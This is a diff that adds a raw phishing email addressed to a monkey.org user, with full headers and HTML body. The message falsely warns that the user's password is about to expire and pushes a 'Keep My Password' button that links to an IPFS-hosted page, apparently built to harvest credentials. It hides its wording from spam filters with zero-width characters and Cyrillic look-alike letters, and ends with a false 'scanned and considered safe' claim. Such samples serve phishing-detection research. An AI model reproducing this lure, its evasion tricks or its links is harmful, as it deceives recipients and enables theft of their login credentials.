@@ -1,0 +1,151 @@
+Return-Path: admin@mcarnes.com.br
+Delivered-To: jose@monkey.org
+X-FDA: 79864962282.45.37A5E4C
+Received: from mcarnes.com.br (mx01.mcarnes.com.br [143.255.12.239])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP id 4B10710A4EEB4
+	for <jose@monkey.org>; Thu,  1 Sep 2022 22:30:40 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+	by mcarnes.com.br (Postfix) with ESMTP id B80324716EF9
+	for <jose@monkey.org>; Thu,  1 Sep 2022 17:55:29 -0300 (-03)
+Received: from mcarnes.com.br ([127.0.0.1])
+	by localhost (mcarnes.com.br [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id X4dzSeeyUcRV for <jose@monkey.org>;
+	Thu,  1 Sep 2022 17:55:26 -0300 (-03)
+Received: from localhost (localhost [127.0.0.1])
+	by mcarnes.com.br (Postfix) with ESMTP id 0DE064398C0A
+	for <jose@monkey.org>; Thu,  1 Sep 2022 15:06:20 -0300 (-03)
+DKIM-Filter: OpenDKIM Filter v2.10.3 mcarnes.com.br 0DE064398C0A
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mcarnes.com.br;
+	s=57560CA4-14EE-11ED-BE35-8FFAC263C415; t=1662055580;
+	bh=qLW/XvmuG2EQzfqqM6NsbHAk8i2sAoRjtfXWeYR3xkQ=;
+	h=From:To:Date:Message-ID:MIME-Version;
+	b=WD5rNhVihHRbFR3nnYJrMASF56Bch+Y+ajPHjzNsWkd+I5uMmSM6kG87uqDxXrpcr
+	 SYnDWFM0qG5XIjPrB0snzuS66/o1HezYAwv+XBES+ukJPc0PY9hARailxXEXO6HFJh
+	 jJ2Ayl4nIxlrily6fbIaOzH1mdMNehFBqyblQou7EMcov9htYtGx8+GHPs8t410Ych
+	 gUhLAbjw4/KsRxLxn9pnYfBG6YTtIRH60jS7JuvNLOR0mAwN4lht+UJF8TS/jUVWmg
+	 Fy4joJjP0xmhQsbGkWu1PvaPJ6EDQjYNtAR821Lal3hLdzDzEfECPlngBz08VcRMhV
+	 3eNDObAkm+51Q==
+X-Virus-Scanned: amavisd-new at mcarnes.com.br
+Received: from mcarnes.com.br ([127.0.0.1])
+	by localhost (mcarnes.com.br [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id Rnozg0YhJjsF for <jose@monkey.org>;
+	Thu,  1 Sep 2022 15:06:19 -0300 (-03)
+Received: from mcarnes.com.br (unknown [146.70.87.19])
+	by mcarnes.com.br (Postfix) with ESMTPSA id 3791D45F385A
+	for <jose@monkey.org>; Thu,  1 Sep 2022 13:07:21 -0300 (-03)
+From: monkey.org  <admin@mcarnes.com.br>
+To: jose@monkey.org
+Subject: Your email password has expired.
+Date: 01 Sep 2022 09:07:21 -0700
+Message-ID: <20220901090721.FCA528FE16256ADA@mcarnes.com.br>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1662071440;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=qLW/XvmuG2EQzfqqM6NsbHAk8i2sAoRjtfXWeYR3xkQ=;
+	b=vbaiyqVimk5FpHXWkMGyer9i4nAgURe6zM5hnrCTglsqj3BuCQPGg4WrDG3XHMZLscrLey
+	BoJ7TLO/aH+NJcG8TMc6g98udJ+EtWhxcTtm4bkJI0PDFY/TbpogBHfXvllT7yTAe1wBo1
+	hwv5OG84XJZv0JbTj7a0GGGLbTrwGyA=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1662071440; a=rsa-sha256;
+	cv=none;
+	b=mgaAuWvlBBJ9teI+12Y2EbkqIo/Y/dWnGzev7OuBB1nyd0GW4ItRBzp0ouVQsd2i6yZkdp
+	tk60VJrbbkUsTIh9dFBoNE1G883xaix9Hd77y9IGA84YQw1+CWdaiY8xzAQZCT5cJ3ck6j
+	d3zlWX3mkg3h92y1/vVWWVtKEwvtxNY=
+ARC-Authentication-Results: i=1;
+	imf14.b.hostedemail.com;
+	dkim=none ("invalid DKIM record") header.d=mcarnes.com.br header.s=57560CA4-14EE-11ED-BE35-8FFAC263C415 header.b=WD5rNhVi;
+	dmarc=pass (policy=quarantine) header.from=mcarnes.com.br;
+	spf=pass (imf14.b.hostedemail.com: domain of admin@mcarnes.com.br designates 143.255.12.239 as permitted sender) smtp.mailfrom=admin@mcarnes.com.br
+Authentication-Results: imf14.b.hostedemail.com;
+	dkim=none ("invalid DKIM record") header.d=mcarnes.com.br header.s=57560CA4-14EE-11ED-BE35-8FFAC263C415 header.b=WD5rNhVi;
+	dmarc=pass (policy=quarantine) header.from=mcarnes.com.br;
+	spf=pass (imf14.b.hostedemail.com: domain of admin@mcarnes.com.br designates 143.255.12.239 as permitted sender) smtp.mailfrom=admin@mcarnes.com.br
+X-Rspam-User: 
+X-Rspamd-Server: rspam04
+X-Spam-Status: Yes, score=12.70
+X-Stat-Signature: hij8mnajtxp61qwwmb7kfh1pjnytzj6h
+X-Rspamd-Queue-Id: 4B10710A4EEB4
+X-HE-Tag: 1662071440-176050
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 140
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.20512"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<DIV id=3D:12w class=3D"Ar Au Ao" style=3D"DISPLAY: block">
+<DIV spellcheck=3Dfalse role=3Dtextbox tabIndex=3D1 aria-label=3D"Message B=
+ody" aria-multiline=3Dtrue id=3D:12s class=3D"Am Al editable LW-avf tS-tW t=
+S-tY" hideFocus contentEditable=3Dtrue style=3D"DIRECTION: ltr; MIN-HEIGHT:=
+ 240px" g_editable=3D"true">
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: "Helvetic=
+a Neue", Helvetica, Arial, sans-serif; COLOR: rgb(29,34,40); MARGIN-TOP: 0p=
+x'><FONT style=3D"BOX-SIZING: border-box" face=3D"Segoe UI Light"><SPAN sty=
+le=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">monkey.org&nbsp;A&#65279=
+;&#65279;&#65279;&#65279;c&#65279;&#65279;co&#65279;&#65279;&#65279;&#65279=
+;unt</SPAN><BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: bo=
+rder-box">
+<FONT style=3D"BOX-SIZING: border-box" color=3D#2670ec size=3D5>Im&#65279;&=
+#65279;por&#65279;&#65279;ta&#65279;&#65279;nt&#65279;&#65279; &#65279;&#65=
+279;Notice</FONT><BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZI=
+NG: border-box">Hi info,&#65279;&#65279;<BR style=3D"BOX-SIZING: border-box=
+"><BR style=3D"BOX-SIZING: border-box">
+Your &#65279;&#65279;&#65279;&#65279;password is s&#1077;&#65279;&#65279;&#=
+65279;&#65279;t to &#1077;&#65279;&#65279;&#65279;&#65279;xpir&#1077;&#6527=
+9;&#65279;&#65279;&#65279; in<SPAN style=3D"BOX-SIZING: border-box">&nbsp;<=
+/SPAN><FONT style=3D"BOX-SIZING: border-box" color=3D#ff0000>2</FONT><SPAN =
+style=3D"BOX-SIZING: border-box">&nbsp;</SPAN>d&#1072;&#65279;&#65279;&#652=
+79;&#65279;y(s).<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZIN=
+G: border-box">
+&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#65279=
+;&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#6527=
+9;&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#652=
+79;&nbsp;&#65279;&#65279;&#65279;&#65279;&#10687;&#65279;&#65279;&#65279;&#=
+65279; &#65279;&#65279;&#65279;&#65279; monkey.org<BR style=3D"BOX-SIZING: =
+border-box"><BR style=3D"BOX-SIZING: border-box">
+We&nbsp;urge you to take the time now to ma&#1110;&#65279;&#65279;&#65279;&=
+#65279;nta&#1110;&#65279;&#65279;&#65279;&#65279;n y&#1086;&#65279;&#65279;=
+&#65279;&#65279;ur p&#1072;&#65279;&#65279;&#65279;&#65279;ssw&#1086;&#6527=
+9;&#65279;&#65279;&#65279;rd act&#1110;&#65279;&#65279;&#65279;&#65279;v&#1=
+110;&#65279;&#65279;&#65279;&#65279;ty to avoid log&#1110;&#65279;&#65279;&=
+#65279;&#65279;n &#1110;&#65279;&#65279;&#65279;&#65279;nterrupti&#1086;&#6=
+5279;&#65279;&#65279;&#65279;n.<BR=20
+style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><A cl=
+ass=3Dgmail-v1yiv9588887225lsuo8 style=3D'BOX-SIZING: border-box; FONT-SIZE=
+: 15px; FONT-FAMILY: "segoe ui light"; BACKGROUND: rgb(38,112,236); COLOR: =
+rgb(255,255,255); PADDING-BOTTOM: 7px; PADDING-TOP: 7px; PADDING-LEFT: 7px;=
+ PADDING-RIGHT: 7px; text-decoration-line: none' href=3D"https://ipfs.io/ip=
+fs/QmRa62N91Wd7V93L9181B3zAAPmXceH2syy73CY2QyL28D#jose@monkey.org" rel=3Dno=
+referrer target=3D_blank>
+K&#1077;&#65279;&#65279;&#1077;&#65279;&#65279;p M&#65279;y &#1056;&#65279;=
+&#65279;&#1072;&#65279;&#65279;ss&#65279;w&#65279;&#65279;or&#65279;d</A></=
+FONT></P><A style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: =
+"Helvetica Neue", Helvetica, Arial, sans-serif; COLOR: rgb(29,34,40); text-=
+decoration-line: none' href=3D"https://stellarhomes.ae:2096/cpsess694576528=
+2/3rdparty/roundcube/#NOP" rel=3Dnoreferrer></A>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; COLOR: rgb=
+(44,54,58)"></SPAN><SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; =
+FONT-FAMILY: "Helvetica Neue", Helvetica, Arial, sans-serif; COLOR: rgb(29,=
+34,40)'></SPAN><SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, sans-se=
+rif; COLOR: rgb(44,54,58)"></SPAN>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: "Helvetic=
+a Neue", Helvetica, Arial, sans-serif; MARGIN-TOP: 0px; LINE-HEIGHT: 20px'>=
+<FONT color=3D#660000>Thank You&nbsp;</FONT></P>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: "Helvetic=
+a Neue", Helvetica, Arial, sans-serif; MARGIN-TOP: 0px; LINE-HEIGHT: 20px'>=
+<FONT color=3D#660000>monkey.org Support</FONT><BR style=3D"BOX-SIZING: bor=
+der-box"><FONT style=3D'BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-FAMIL=
+Y: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif; COLOR: rgb(29,34=
+,40)' color=3D#868778>This mail has been scanned and considered safe.</FONT=
+></P></DIV></DIV></BODY></HTML>
+
